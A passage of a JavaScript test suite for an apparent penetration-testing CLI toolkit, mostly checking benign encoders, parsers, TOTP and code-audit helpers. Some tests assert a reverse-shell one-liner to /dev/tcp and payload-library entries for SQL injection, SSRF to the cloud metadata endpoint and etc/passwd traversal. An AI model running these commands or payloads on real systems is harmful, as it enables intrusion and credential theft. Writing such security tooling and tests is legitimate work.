  ok("defang https + email", defang("https://a.b/c") === "hxxps[://]a[.]b/c" && defang("bad@evil.com") === "bad[@]evil[.]com");
  ok("defang an IP", defang("8.8.8.8") === "8[.]8[.]8[.]8");
  ok("refang reverses defang", refang("hxxp[://]evil[.]com") === "http://evil.com");
  const original = "https://evil.example.com/path?u=admin@corp.com and 10.0.0.1";
  ok("defang -> refang round-trips", refang(defang(original)) === original);
  ok("refang tolerates plain hxxp://", refang("hxxp://x[.]y") === "http://x.y");
}

group("entropy tool (secret / randomness detection)");
{
  ok("all-same char → 0 bits", shannon("aaaaaa") === 0);
  ok("empty → 0", shannon("") === 0);
  ok("4 equal symbols → 2 bits/char", Math.abs(shannon("abcd") - 2) < 1e-9);
  ok("8 equal symbols → 3 bits/char", Math.abs(shannon("abcdefgh") - 3) < 1e-9);
  ok("random 32-hex key → high", assess("9f86d081884c7d659a2feaa0c55ad015").level === "high" && assess("9f86d081884c7d659a2feaa0c55ad015").likelySecret === true);
  ok("predictable value → low", assess("password").level === "low" && assess("aaaaaaaaaaaaaaaa").level === "low");
  ok("assess reports totalBits", Math.abs(assess("abcd").totalBits - 8) < 1e-9);
}

group("epoch / timestamp converter");
{
  ok("epoch 0 → 1970 ISO", epochConvert("0").iso === "1970-01-01T00:00:00.000Z");
  ok("seconds → ISO", epochConvert("1700000000").iso === "2023-11-14T22:13:20.000Z" && epochConvert("1700000000").from === "epoch");
  ok("13-digit ms treated as ms", epochConvert("1700000000000").iso === "2023-11-14T22:13:20.000Z" && epochConvert("1700000000000").epochMs === 1700000000000);
  ok("ISO string → epoch seconds", epochConvert("2023-11-14T22:13:20Z").epochSeconds === 1700000000 && epochConvert("2023-11-14T22:13:20Z").from === "date");
  ok("provides utc + epochMs", epochConvert("1700000000").epochMs === 1700000000000 && /GMT/.test(epochConvert("1700000000").utc));
  ok("garbage → null", epochConvert("not-a-timestamp") === null);
  ok("oversized epoch → null (not a RangeError)", epochConvert("99999999999999999") === null && epochConvert("9000000000000000") === null);
}

group("URL parser tool");
{
  const u = parseUrl("https://user:pw@host.example.com:8443/a/b?x=1&y=2#frag");
  ok("full URL breakdown", u.scheme === "https" && u.host === "host.example.com" && u.port === "8443" && u.path === "/a/b");
  ok("query params + fragment + creds", u.params.x === "1" && u.params.y === "2" && u.fragment === "frag" && u.username === "user" && u.password === "pw");
  const s = parseUrl("example.com:8080/api?q=test");
  ok("scheme-less host:port defaults to http", s.scheme === "http" && s.host === "example.com" && s.port === "8080" && s.params.q === "test");
  ok("plain domain", parseUrl("evil.com").host === "evil.com" && parseUrl("evil.com").scheme === "http");
  ok("empty / garbage → null", parseUrl("") === null && parseUrl("http://") === null);
  ok("a param named __proto__ is kept, not silently dropped", (() => { const p = parseUrl("http://h/?__proto__=evil&a=1").params; return Object.prototype.hasOwnProperty.call(p, "__proto__") && p.__proto__ === "evil" && p.a === "1"; })());
}

group("base32 (RFC 4648 test vectors)");
{
  ok("empty", base32encode("") === "");
  ok("'f' → MY======", base32encode("f") === "MY======");
  ok("'fo' → MZXQ====", base32encode("fo") === "MZXQ====");
  ok("'foo' → MZXW6===", base32encode("foo") === "MZXW6===");
  ok("'foobar' → MZXW6YTBOI======", base32encode("foobar") === "MZXW6YTBOI======");
  ok("decode reverses (padded)", base32decode("MZXW6YTBOI======") === "foobar");
  ok("decode lowercase + spaces tolerated", base32decode("mzxw6===") === "foo");
  ok("round-trips arbitrary text", base32decode(base32encode("Darknode/Nexus 42!")) === "Darknode/Nexus 42!");
  ok("invalid char → null", base32decode("MZXW6!!!") === null);
}

group("TOTP / HOTP (RFC 4226 / 6238 test vectors)");
{
  const key = Buffer.from("12345678901234567890"); // RFC test key
  ok("HOTP counter 0 → 755224", hotp(key, 0, 6) === "755224");
  ok("HOTP counter 1 → 287082", hotp(key, 1, 6) === "287082");
  ok("HOTP counter 2 → 359152", hotp(key, 2, 6) === "359152");
  const secret = base32encode("12345678901234567890"); // base32 form of the RFC key
  ok("TOTP T=59 (8-digit) → 94287082", totp(secret, { time: 59, digits: 8 }) === "94287082");
  ok("TOTP T=1111111109 → 07081804", totp(secret, { time: 1111111109, digits: 8 }) === "07081804");
  ok("TOTP T=20000000000 → 65353130", totp(secret, { time: 20000000000, digits: 8 }) === "65353130");
  ok("TOTP 6-digit at T=59 → 287082", totp(secret, { time: 59 }) === "287082");
  ok("TOTP invalid secret → null", totp("not base32!!!") === null && totp("") === null);
  ok("secondsRemaining within a 30s step", secondsRemaining(30, 59) === 1 && secondsRemaining(30, 45) === 15);
}

group("JWT decode + analysis");
{
  const b64u = (o) => Buffer.from(JSON.stringify(o)).toString("base64").replace(/=/g, "").replace(/\+/g, "-").replace(/\//g, "_");
  const mk = (h, p) => b64u(h) + "." + b64u(p) + ".sig";
  const expired = mk({ alg: "HS256", typ: "JWT" }, { sub: "user1", exp: 1000000000 }); // exp = 2001
  const a1 = analyzeJwt(expired, 2000000000);
  ok("decodes header + payload", a1.header.alg === "HS256" && a1.payload.sub === "user1");
  ok("flags expired token", a1.expired === true && a1.state === "expired");
  const valid = mk({ alg: "HS256" }, { exp: 3000000000 });
  ok("valid (unexpired) token", analyzeJwt(valid, 1000000000).expired === false && analyzeJwt(valid, 1000000000).state === "valid");
  const nbf = mk({ alg: "HS256" }, { nbf: 5000000000 });
  ok("not-yet-valid (nbf future)", analyzeJwt(nbf, 1000000000).notYetValid === true);
  const none = mk({ alg: "none" }, { sub: "x" });
  ok("warns on alg=none", analyzeJwt(none).alg === "none" && analyzeJwt(none).warnings.some((w) => /alg=none/.test(w)));
  ok("no-exp token → state no-exp", analyzeJwt(mk({ alg: "HS256" }, { sub: "x" })).state === "no-exp");
  ok("garbage → null", analyzeJwt("not.a.jwt.x") === null && analyzeJwt("only-one-part") === null && decodeJwt("") === null);
}

group("User-Agent parser");
{
  const chrome = parseUA("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36");
  ok("Chrome on Windows 10 (not Safari)", chrome.browser === "Chrome" && chrome.version.startsWith("120") && chrome.os === "Windows 10/11" && chrome.device === "desktop");
  const iphone = parseUA("Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1");
  ok("Safari on iOS mobile", iphone.browser === "Safari" && /iOS 17/.test(iphone.os) && iphone.device === "mobile");
  const edge = parseUA("Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36 Edg/120.0");
  ok("Edge (before Chrome)", edge.browser === "Edge");
  const android = parseUA("Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Mobile Safari/537.36");
  ok("Android mobile", /Android 14/.test(android.os) && android.device === "mobile");
  ok("curl is a bot", parseUA("curl/8.4.0").browser === "curl" && parseUA("curl/8.4.0").bot === true);
  ok("Googlebot detected", parseUA("Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)").bot === true);
  ok("empty → null", parseUA("") === null && parseUA(null) === null);
}

group("port <-> service lookup");
{
  ok("portName 22 → ssh, 3306 → mysql", portName(22) === "ssh" && portName(3306) === "mysql");
  ok("portName unknown → null", portName(9999) === null);
  ok("findByName redis → [6379]", JSON.stringify(findByName("redis")) === JSON.stringify([6379]));
  ok("portLookup number", portLookup("3306").kind === "port" && portLookup("3306").service === "mysql");
  ok("portLookup unknown number → null service", portLookup("9999").service === null);
  ok("portLookup name → sorted ports", portLookup("mysql").kind === "name" && JSON.stringify(portLookup("mysql").ports) === JSON.stringify([3306]));
  ok("portLookup http-family matches several", portLookup("http").ports.length >= 4);
  ok("empty → null", portLookup("") === null);
}

group("command registry (batch 1)");
{
  const { CMDS, CMD_MAP } = require("../lib/cli/registry");
  const plain = { red: (s) => s, green: (s) => s, yellow: (s) => s, cyan: (s) => s, gray: (s) => s, bold: (s) => s };
  ok("names + aliases are unique", (() => { const seen = new Set(); for (const cmd of CMDS) { for (const n of [cmd.name, ...(cmd.aliases || [])]) { if (seen.has(n)) return false; seen.add(n); } } return true; })());
  ok("every run() returns a string", CMDS.every((cmd) => typeof cmd.run({ rest: [], c: plain }) === "string"));
  ok("aliases resolve to the same entry", CMD_MAP.inrange === CMD_MAP.incidr);
  eq("defang output matches", CMD_MAP.defang.run({ rest: ["http://evil.com/path"], c: plain }), "hxxp[://]evil[.]com/path");
  eq("incidr yes", CMD_MAP.incidr.run({ rest: ["10.0.0.5", "10.0.0.0/24"], c: plain }), "  yes — 10.0.0.5 is inside 10.0.0.0/24");
  eq("incidr no", CMD_MAP.incidr.run({ rest: ["10.0.9.9", "10.0.0.0/24"], c: plain }), "  no — 10.0.9.9 is NOT inside 10.0.0.0/24");
  ok("entropy usage on empty", CMD_MAP.entropy.run({ rest: [], c: plain }).includes("usage: darknode entropy"));
  eq("port number lookup (plain)", CMD_MAP.port.run({ rest: ["3306"], c: plain }), "  3306  mysql");
  ok("port name lookup returns multi-line joined string", (() => { const s = CMD_MAP.port.run({ rest: ["http"], c: plain }); return s.split("\n").length >= 4 && s.includes("80") && s.includes("443"); })());
  ok("url returns a multi-line block ending in a blank line", (() => { const s = CMD_MAP.url.run({ rest: ["https://h.com:8443/p?a=1"], c: plain }); return s.endsWith("\n") && s.includes("scheme") && s.includes("8443") && s.includes("query params:"); })());
  ok("url usage on empty", CMD_MAP.url.run({ rest: [], c: plain }).includes("usage: darknode url"));
  ok("useragent + ua alias resolve to one entry", CMD_MAP.ua === CMD_MAP.useragent);
  ok("useragent parses a Chrome UA", (() => { const s = CMD_MAP.useragent.run({ rest: ["Mozilla/5.0 (Windows NT 10.0) Chrome/120.0 Safari/537.36"], c: plain }); return s.includes("Chrome 120.0") && s.includes("Windows 10/11") && s.endsWith("\n"); })());
  ok("cidr computes a /30", (() => { const s = CMD_MAP.cidr.run({ rest: ["10.0.0.0/30"], c: plain }); return s.includes("Network") && s.includes("Hosts") && s.includes("2"); })());
  ok("cidr usage on garbage", CMD_MAP.cidr.run({ rest: ["nope"], c: plain }).includes("usage: darknode cidr"));
  ok("epoch + time + ts aliases share one entry", CMD_MAP.time === CMD_MAP.epoch && CMD_MAP.ts === CMD_MAP.epoch);
  ok("epoch converts a fixed unix ts deterministically", (() => { const s = CMD_MAP.epoch.run({ rest: ["1700000000"], c: plain }); return s.includes("2023-11-14T22:13:20") && s.includes("epoch (ms)  1700000000000"); })());
  {
    const b64 = (o) => Buffer.from(JSON.stringify(o)).toString("base64").replace(/=/g, "").replace(/\+/g, "-").replace(/\//g, "_");
    const mk = (h, p) => b64(h) + "." + b64(p) + ".sig";
    const valid = mk({ alg: "HS256", typ: "JWT" }, { sub: "1", exp: 9999999999 });
    const expired = mk({ alg: "HS256", typ: "JWT" }, { sub: "2", exp: 1000000000 });
    const none = mk({ alg: "none", typ: "JWT" }, { sub: "3" });
    ok("jwt VALID state for far-future exp", CMD_MAP.jwt.run({ rest: [valid], c: plain }).includes("status: VALID"));
    ok("jwt EXPIRED state for past exp", CMD_MAP.jwt.run({ rest: [expired], c: plain }).includes("status: EXPIRED"));
    ok("jwt flags alg=none", CMD_MAP.jwt.run({ rest: [none], c: plain }).includes("warning: alg=none"));
    ok("jwt rejects non-JWT with usage", CMD_MAP.jwt.run({ rest: ["not-a-jwt"], c: plain }).includes("not a valid JWT"));
  }
  eq("revshell bash exact", CMD_MAP.revshell.run({ rest: ["bash", "10.10.14.7", "4444"], c: plain }), "bash -i >& /dev/tcp/10.10.14.7/4444 0>&1");
  ok("revshell defaults (no args) -> bash/10.0.0.1/4444", CMD_MAP.revshell.run({ rest: [], c: plain }) === "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1");
  ok("revshell unknown lang falls back to bash", CMD_MAP.revshell.run({ rest: ["zzz", "1.2.3.4", "9001"], c: plain }).startsWith("bash -i"));
  eq("status 404 (plain)", CMD_MAP.status.run({ rest: ["404"], c: plain }), "404 Not Found  · 4xx client error");
  ok("status unknown code -> usage", CMD_MAP.status.run({ rest: ["999"], c: plain }).includes("unknown status code"));
  ok("dorks builds a block per dork + h1", (() => { const s = CMD_MAP.dorks.run({ rest: ["example.com"], c: plain }); return s.includes("Google dorks for example.com") && s.includes("google.com/search?q=") && s.includes(encodeURIComponent("site:example.com")); })());
  ok("dorks usage on empty", CMD_MAP.dorks.run({ rest: [], c: plain }).includes("usage: darknode dorks"));
  ok("cheats no-arg lists topics", CMD_MAP.cheats.run({ rest: [], c: plain }).startsWith("topics: "));
  ok("cheats topic returns its lines", (() => { const s = CMD_MAP.cheats.run({ rest: ["nmap"], c: plain }); return s.includes("nmap") && !s.startsWith("topics:"); })());
  ok("cheats unknown topic falls back to topic list", CMD_MAP.cheats.run({ rest: ["zzz"], c: plain }).startsWith("topics: "));
  eq("encode b64", CMD_MAP.encode.run({ rest: ["b64", "Hello World!"], c: plain }), "SGVsbG8gV29ybGQh");
  eq("decode b64 roundtrips", CMD_MAP.decode.run({ rest: ["b64", "SGVsbG8gV29ybGQh"], c: plain }), "Hello World!");
  eq("encode hex", CMD_MAP.encode.run({ rest: ["hex", "Hello"], c: plain }), "48656c6c6f");
  eq("unknown type message", CMD_MAP.encode.run({ rest: ["zzz", "x"], c: plain }), "unknown type (b64|hex|url|base32)");
  eq("decode base32 invalid message", CMD_MAP.decode.run({ rest: ["base32", "!!!"], c: plain }), "(invalid base32)");
  ok("uuid returns a v4 UUID", /^[0-9a-f]{8}-[0-9a-f]{4}-4[0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$/i.test(CMD_MAP.uuid.run({ rest: [], c: plain })));
  ok("passphrase default shape = 4 words + bits label", /^  \S+(-\S+){3}  \(~32 bits\)$/.test(CMD_MAP.passphrase.run({ rest: [], c: plain })));
  ok("passphrase honors count arg (6 words, 48 bits)", /^  \S+(-\S+){5}  \(~48 bits\)$/.test(CMD_MAP.passphrase.run({ rest: ["6"], c: plain })));
  ok("passphrase non-numeric arg -> default 4 words", /(-\S+){3}  \(~32 bits\)$/.test(CMD_MAP.passphrase.run({ rest: ["abc"], c: plain })));
  // registry commands must NOT also have a leftover 'cmd === ' branch (no double dispatch)
  const src = fs.readFileSync(path.join(__dirname, "..", "darknode.js"), "utf8");
  const doubled = CMDS.flatMap((cmd) => [cmd.name, ...(cmd.aliases || [])]).filter((n) => src.includes('cmd === "' + n + '"'));
  eq("no migrated command still dispatched inline", doubled, []);
}

group("render cache: only text items count as still revealing");
{
  // thinking items carry `full` but never `shown` (no typewriter); treating them as
  // "still revealing" made every message with thinking uncacheable — a 300-message
  // session re-rendered 22k lines per keystroke (~58ms; typed keys batched and lagged).
  const src = fs.readFileSync(path.join(__dirname, "..", "darknode.js"), "utf8");
  const sig = (src.match(/const _msgSig = \(m, g\) => \{[\s\S]*?\n    \};/) || [""])[0];
  ok("_msgSig found", sig.length > 0);
  ok("reveal check is gated on it.type === \"text\"", /it\.type === "text" && it\.full != null && \(it\.shown \| 0\) < String\(it\.full\)\.length/.test(sig));
}

group("inline CLI subcommands run (no out-of-scope fs/path)");
{
  const tmp = fs.mkdtempSync(path.join(os.tmpdir(), "nx-cli-"));
  const dn = (args) => require("child_process").spawnSync(process.execPath, [path.join(__dirname, "..", "darknode.js")].concat(args), { cwd: tmp, encoding: "utf8", timeout: 30000, env: Object.assign({}, process.env, { HOME: tmp, USERPROFILE: tmp }) });
  let r = dn(["marketplace"]); ok("darknode marketplace lists (empty)", r.status === 0 && /no marketplace packages installed/.test(r.stdout) && !/is not defined/.test(r.stdout + r.stderr));
  r = dn(["cron"]); ok("darknode cron lists (empty)", r.status === 0 && /no scheduled jobs/.test(r.stdout) && !/is not defined/.test(r.stdout + r.stderr));
  fs.rmSync(tmp, { recursive: true, force: true });
}

group("no dead lib imports in darknode.js");
{
  const src = fs.readFileSync(path.join(__dirname, "..", "darknode.js"), "utf8");
  const imported = new Set();
  for (const m of src.matchAll(/const \{([^}]*)\} = require\("\.\/lib\/[^"]+"\)/g))
    m[1].split(",").forEach((n) => { n = n.trim().split(":").pop().trim(); if (n) imported.add(n); });
  const dead = [...imported].filter((n) => {
    const re = new RegExp("\\b" + n.replace(/[.*+?^${}()|[\]\\]/g, "\\$&") + "\\b", "g");
    return (src.match(re) || []).length === 1; // only the import itself
  });
  eq("every destructured lib import is used", dead, []);
}

group("encoders (shared CLI + menu)");
{
  const { ENC } = require("../lib/toolkit/encoders");
  eq("op keys present", Object.keys(ENC).sort(), ["b64d", "b64e", "base32d", "base32e", "base58d", "base58e", "hexd", "hexe", "rot13d", "rot13e", "urld", "urle"]);
  ok("b64/hex/url/base32 all roundtrip", ["b64", "hex", "url", "base32"].every((t) => ENC[t + "d"](ENC[t + "e"]("Darknode 42!")) === "Darknode 42!"));
  eq("url encodes a space", ENC.urle("a b"), "a%20b");
  eq("invalid base32 -> guarded message", ENC.base32d("!!!"), "(invalid base32)");
}

group("tech-debt scanner (/todo)");
{
  const { scanText, summarizeTodos, rankTodos, scanTree, TAGS } = require("../lib/nexus/todos");
  const src = ["a=1 // TODO: wire it", "// FIXME broken", "ok()", "  # HACK: temp", "plain", "// NOTE - test later", "let TODOLIST=[] // no marker"].join("\n");
  const items = scanText(src, "a.js");
  eq("finds the four real markers in order of appearance", items.map((i) => i.tag), ["TODO", "FIXME", "HACK", "NOTE"]);
  ok("captures file + line + text", items[0].file === "a.js" && items[0].line === 1 && items[0].text === "wire it");
  ok("word-boundary excludes TODOLIST", !items.some((i) => i.text.includes("no marker")));
  eq("summarize", summarizeTodos(items), { total: 4, byTag: { TODO: 1, FIXME: 1, HACK: 1, NOTE: 1 }, files: 1 });
  eq("rank by severity (FIXME>HACK>TODO>NOTE)", rankTodos(items).map((i) => i.tag), ["FIXME", "HACK", "TODO", "NOTE"]);
  ok("TAGS covers common markers", ["TODO", "FIXME", "HACK", "BUG"].every((t) => TAGS.includes(t)));
  // scanTree over a temp project: skips node_modules, reads source
  const d = fs.mkdtempSync(path.join(os.tmpdir(), "nexus-todo-"));
  fs.writeFileSync(path.join(d, "x.js"), "// TODO: alpha\nfn()\n// BUG: beta\n");
  fs.mkdirSync(path.join(d, "node_modules")); fs.writeFileSync(path.join(d, "node_modules", "dep.js"), "// TODO: should be ignored\n");
  fs.writeFileSync(path.join(d, "notes.txt"), "// TODO: non-source ignored\n");
  const { items: tree, files } = scanTree(d);
  ok("scanTree reads source, skips node_modules + non-code", tree.length === 2 && files === 1 && tree.every((i) => i.file === "x.js"));
  ok("scanTree respects maxItems", scanTree(d, { maxItems: 1 }).items.length === 1);
  try { fs.rmSync(d, { recursive: true, force: true }); } catch (_) {}
}

group("ultrareview (multi-lens review prompt)");
{
  const { buildReviewPrompt, countBySeverity, DIMENSIONS, SEVERITY } = require("../lib/nexus/review");
  const p = buildReviewPrompt("diff --git a/x b/x\n+ dangerous()", {});
  ok("prompt covers every dimension", DIMENSIONS.every((d) => p.includes(d.label)));
  ok("prompt embeds the diff + asks for severity + verdict", p.includes("dangerous()") && SEVERITY.every((s) => p.includes(s)) && /VERDICT/.test(p));
  ok("diff is truncated past maxDiff", buildReviewPrompt("x".repeat(30000), { maxDiff: 100 }).includes("truncated"));
  eq("countBySeverity tallies tags case-insensitively", countBySeverity("[CRITICAL] a\n[high] b\n[High] c\n[nit] d"), { critical: 1, high: 2, medium: 0, low: 0, nit: 1 });
}

group("changelog (release notes)");
{
  const { classify, parseCommits, groupCommits, renderChangelog } = require("../lib/nexus/changelog");
  eq("classify conventional commit", classify("feat(cli): add /env"), { type: "feat", scope: "cli", breaking: false, subject: "add /env" });
  eq("classify non-conventional -> other", classify("random change").type, "other");
  ok("classify flags breaking (!)", classify("feat!: drop node 16").breaking === true);
  const cs = parseCommits("a1b2c3\tfeat: thing\nd4e5f6\tfix(ui): crash\n9z8y7x\tchore: bump\nqqq\tno-type here");
  eq("parseCommits parses hash + type", [cs.length, cs[0].hash, cs[0].type, cs[3].type], [4, "a1b2c3", "feat", "other"]);
  const g = groupCommits(cs);
  ok("groupCommits buckets by type", g.feat.length === 1 && g.fix.length === 1 && g.chore.length === 1 && g.other.length === 1);
  const md = renderChangelog(cs, { title: "Release 2.30", range: "v2.29..HEAD" });
  ok("renders grouped markdown with scope + hash", md.includes("# Release 2.30") && md.includes("## Features") && md.includes("**ui:** crash") && md.includes("(a1b2c3)"));
  ok("empty range renders a placeholder", renderChangelog([], {}).includes("No commits"));
}

group("env-var audit (/env)");
{
  const { scanEnvRefs, parseEnvFile, auditEnv, readEnvFiles, scanEnvTree, COMMON } = require("../lib/nexus/envaudit");
  const src = 'const a=process.env.API_KEY; const b=process.env["DB_URL"]; if(process.env.NODE_ENV==="p"){} const p=process.env.PORT;';
  eq("scanEnvRefs finds all forms", scanEnvRefs(src).sort(), ["API_KEY", "DB_URL", "NODE_ENV", "PORT"]);
  eq("parseEnvFile honors export + skips comments", parseEnvFile("# c\nexport API_KEY=abc\nDB_URL=x\nSTALE=1\n\n"), ["API_KEY", "DB_URL", "STALE"]);
  const a = auditEnv({ used: scanEnvRefs(src), declared: ["API_KEY", "DB_URL", "STALE"] });
  eq("undocumented excludes common runtime vars (NODE_ENV/PORT)", a.undocumented, []);
  eq("unused = declared but never referenced", a.unused, ["STALE"]);
  ok("undocumented surfaces a real gap", auditEnv({ used: ["SECRET_TOKEN"], declared: [] }).undocumented.length === 1);
  ok("ignoreCommon:false includes NODE_ENV/PORT", auditEnv({ used: scanEnvRefs(src), declared: [], ignoreCommon: false }).undocumented.includes("NODE_ENV"));
  ok("COMMON has the usual runtime vars", COMMON.has("NODE_ENV") && COMMON.has("PORT"));
  // tree + template walk
  const d = fs.mkdtempSync(path.join(os.tmpdir(), "nexus-env-"));
  fs.writeFileSync(path.join(d, "app.js"), 'process.env.API_KEY; process.env.MISSING_ONE;');
  fs.writeFileSync(path.join(d, ".env.example"), "API_KEY=\nOLD_KEY=\n");
  const used = scanEnvTree(d).used, envf = readEnvFiles(d);
  const at = auditEnv({ used, declared: envf.declared });
  ok("end-to-end: MISSING_ONE undocumented, OLD_KEY unused", at.undocumented.includes("MISSING_ONE") && at.unused.includes("OLD_KEY") && envf.files.includes(".env.example"));
  try { fs.rmSync(d, { recursive: true, force: true }); } catch (_) {}
}

group("dependency hygiene (/deps)");
{
  const { packageName, parseImports, auditDeps, isBuiltin, scanImports } = require("../lib/nexus/deps");
  eq("packageName strips subpaths + scopes; null for relative/builtin", [packageName("lodash/fp"), packageName("@babel/core/lib"), packageName("./x"), packageName("fs")], ["lodash", "@babel/core", null, null]);
  ok("isBuiltin handles node: prefix", isBuiltin("fs") && isBuiltin("node:path") && !isBuiltin("express"));
  const src = 'const fs=require("fs"); import x from "express"; import {a} from "@scope/pkg"; const y=require("./local"); import("chalk"); export {z} from "zod/lib";';
  const specs = parseImports(src);
  ok("parseImports covers require/import/dynamic/export-from", ["fs", "express", "@scope/pkg", "./local", "chalk", "zod/lib"].every((s) => specs.includes(s)));
  const a = auditDeps({ pkg: { dependencies: { express: "^4", unusedpkg: "^1" }, devDependencies: { jest: "^29" } }, specifiers: specs });
  eq("unused = declared minus imported", a.unused, ["jest", "unusedpkg"]);
  eq("missing = imported minus declared (builtins/relative excluded)", a.missing, ["@scope/pkg", "chalk", "zod"]);
  ok("clean project reports no unused/missing", (() => { const c = auditDeps({ pkg: { dependencies: { express: "^4" } }, specifiers: ["express", "fs", "./x"] }); return !c.unused.length && !c.missing.length; })());
  // scanImports over a temp project
  const d = fs.mkdtempSync(path.join(os.tmpdir(), "nexus-deps-"));
  fs.writeFileSync(path.join(d, "a.js"), 'require("chalk"); const p=require("path");');
  fs.mkdirSync(path.join(d, "node_modules")); fs.writeFileSync(path.join(d, "node_modules", "dep.js"), 'require("should-be-ignored");');
  const found = scanImports(d);
  ok("scanImports collects source specifiers, skips node_modules", found.includes("chalk") && found.includes("path") && !found.includes("should-be-ignored"));
  try { fs.rmSync(d, { recursive: true, force: true }); } catch (_) {}
}

group("codebase stats (/stats)");
{
  const { langOf, summarizeStats, rankedLangs, scanStats } = require("../lib/nexus/codestats");
  ok("langOf maps extensions (case-insensitive), unknown -> null", langOf("a.ts") === "TypeScript" && langOf("X.PY") === "Python" && langOf("Makefile") === null);
  const e = [
    { file: "a.js", lines: 100, bytes: 2000, lang: "JavaScript" },
    { file: "b.js", lines: 50, bytes: 900, lang: "JavaScript" },
    { file: "c.py", lines: 200, bytes: 5000, lang: "Python" },
    { file: "readme", lines: 0, bytes: 0, lang: null },
  ];
  const s = summarizeStats(e);
  eq("totals ignore unrecognized files", [s.totalFiles, s.totalLines, s.totalBytes], [3, 350, 7900]);
  ok("byLang aggregates per language", s.byLang.JavaScript.files === 2 && s.byLang.JavaScript.lines === 150 && s.byLang.Python.lines === 200);
  eq("rankedLangs by lines desc", rankedLangs(s).map((l) => l[0]), ["Python", "JavaScript"]);
  eq("largest files by line count", s.largest.map((f) => f.file), ["c.py", "a.js", "b.js"]);
  // scanTree over a temp project: counts source, skips node_modules + non-code
  const d = fs.mkdtempSync(path.join(os.tmpdir(), "nexus-stats-"));
  fs.writeFileSync(path.join(d, "app.js"), "a\nb\nc\n");
  fs.writeFileSync(path.join(d, "svc.py"), "x\ny\n");
  fs.mkdirSync(path.join(d, "node_modules")); fs.writeFileSync(path.join(d, "node_modules", "dep.js"), "ignored\n");
  fs.writeFileSync(path.join(d, "data.bin"), "not source");
  const st = summarizeStats(scanStats(d));
  ok("scanStats reads source, skips node_modules + non-code", st.totalFiles === 2 && st.byLang.JavaScript.files === 1 && st.byLang.Python.files === 1);
  try { fs.rmSync(d, { recursive: true, force: true }); } catch (_) {}
}

group("hashing + password gen");
{
  const { ALGOS, GENPASS_CHARS, digests, genPass } = require("../lib/toolkit/hashing");
  const m = Object.fromEntries(digests("abc"));
  eq("algo order", ALGOS, ["md5", "sha1", "sha256", "sha512"]);
  eq("md5('abc') vector", m.md5, "900150983cd24fb0d6963f7d28e17f72");
  eq("sha256('abc') vector", m.sha256, "ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad");
  ok("digests returns [algo, hex] pairs for every algo", digests("x").length === 4 && digests("x").every((r) => r.length === 2 && /^[0-9a-f]+$/.test(r[1])));
  ok("genPass clamps length to [8,128]", genPass("1").length === 8 && genPass("999").length === 128 && genPass("").length === 20 && genPass("abc").length === 20);
  // deterministic with injected rng: bytes = [0,1,2,...] -> chars[0], chars[1], ...
  const fakeRng = (n) => Buffer.from(Array.from({ length: n }, (_, i) => i));
  eq("genPass deterministic with injected rng", genPass(10, fakeRng), GENPASS_CHARS.slice(0, 10));
  ok("genPass only uses the declared charset", genPass(128, fakeRng).split("").every((ch) => GENPASS_CHARS.includes(ch)));
}

group("cheat-sheets");
{
  const { CHEATS, cheatTopics } = require("../lib/toolkit/cheats");
  eq("expected topics present", cheatTopics().sort(), ["cracking", "nmap", "privesc", "shells", "transfer", "web", "windows"]);
  ok("every topic has a non-empty string-array", cheatTopics().every((t) => Array.isArray(CHEATS[t]) && CHEATS[t].length > 0 && CHEATS[t].every((l) => typeof l === "string" && l.length)));
  ok("nmap cheats mention nmap", CHEATS.nmap.every((l) => l.includes("nmap")));
  ok("privesc includes the SUID find", CHEATS.privesc.some((l) => l.includes("-perm -4000")));
}

group("payload library");
{
  const { PAYLOADS_CLI, payloadClasses } = require("../lib/toolkit/payloads");
  eq("expected classes present", payloadClasses().sort(), ["cmdi", "lfi", "sqli", "ssrf", "ssti", "xss"]);
  ok("every class has a non-empty string array", payloadClasses().every((c) => Array.isArray(PAYLOADS_CLI[c]) && PAYLOADS_CLI[c].length > 0 && PAYLOADS_CLI[c].every((p) => typeof p === "string" && p.length)));
  ok("sqli includes the canonical tautology", PAYLOADS_CLI.sqli.includes("' OR '1'='1"));
  ok("ssrf includes the cloud metadata endpoint", PAYLOADS_CLI.ssrf.some((p) => p.includes("169.254.169.254")));
  ok("lfi includes an etc/passwd traversal", PAYLOADS_CLI.lfi.some((p) => p.includes("etc/passwd")));
}

group("google dork builder");
{
  const { DORK_BASE, DORKS, dorkUrls } = require("../lib/toolkit/dorks");
  ok("catalog non-empty [label, query] pairs", DORKS.length >= 5 && DORKS.every((d) => d.length === 2 && d[0] && d[1]));
  const rows = dorkUrls("example.com");
  ok("one row per dork", rows.length === DORKS.length);
  eq("first row encodes site: query", rows[0], { label: "exposed files", query: 'intitle:"index of"', encoded: encodeURIComponent('site:example.com intitle:"index of"'), url: DORK_BASE + encodeURIComponent('site:example.com intitle:"index of"') });
  ok("every url = base + encoded", rows.every((r) => r.url === DORK_BASE + r.encoded));
  ok("domain is URL-encoded into the query", dorkUrls("a b.com")[0].encoded.includes(encodeURIComponent("site:a b.com ")));
  ok("empty domain does not throw", dorkUrls("").length === DORKS.length && dorkUrls(null).length === DORKS.length);
}

group("http status reference");
{
  const { HTTP_STATUS_MAP, statusClass, statusInfo } = require("../lib/toolkit/httpstatus");
  ok("map covers common codes", HTTP_STATUS_MAP["200"] === "OK" && HTTP_STATUS_MAP["404"] === "Not Found" && HTTP_STATUS_MAP["503"] === "Service Unavailable");
  eq("statusInfo 200", statusInfo("200"), { code: "200", text: "OK", class: "2xx success" });
  eq("statusInfo 418", statusInfo(418), { code: "418", text: "I'm a teapot", class: "4xx client error" });
  eq("statusInfo trims whitespace", statusInfo("  404 "), { code: "404", text: "Not Found", class: "4xx client error" });
  ok("statusInfo unknown/empty → null", statusInfo("999") === null && statusInfo("") === null && statusInfo("abc") === null && statusInfo(null) === null);
